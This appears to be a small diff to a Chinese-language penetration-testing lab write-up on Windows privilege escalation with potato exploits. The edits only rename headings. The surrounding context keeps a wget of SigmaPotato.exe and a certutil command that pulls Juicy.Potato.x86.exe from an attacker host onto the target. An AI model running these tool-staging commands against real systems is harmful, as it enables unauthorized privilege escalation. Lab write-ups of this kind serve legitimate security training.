@@ -360,7 +360,7 @@ Mandatory Label\High Mandatory Level Unknown SID type S-1-16-12288 Mandatory gro
 > ![image](https://hackmd.io/_uploads/ry-wGrT3yg.png)
 > 2. SeImpersonatePrivilege 可以嘗試利用 PrintSpoofer
 
-### 7. PrintSpoofer: SigmaPotato
+### 7. SigmaPotato
 ```
 ┌──(chw㉿CHW)-[~/Desktop/upload_tools]
 └─$ wget https://github.com/tylerdotrar/SigmaPotato/releases/download/v1.2.6/SigmaPotato.exe
@@ -451,7 +451,7 @@ More help is available by typing NET HELPMSG 2221.
 ```
 > 上網 research 後， `SigmaPotato` 不支援 Windows 7/2008 R2 (x86/x64)，需要使用 Juicy-Potato-x86
 
-### 8. PrintSpoofer: Juicy-Potato-x86
+### 8. Juicy-Potato-x86
 #### 8.1 下載 Juicy-Potato-x86.exe
 ```
 C:\Users\Public>certutil -urlcache -split -f http://192.168.45.165/Juicy.Potato.x86.exe
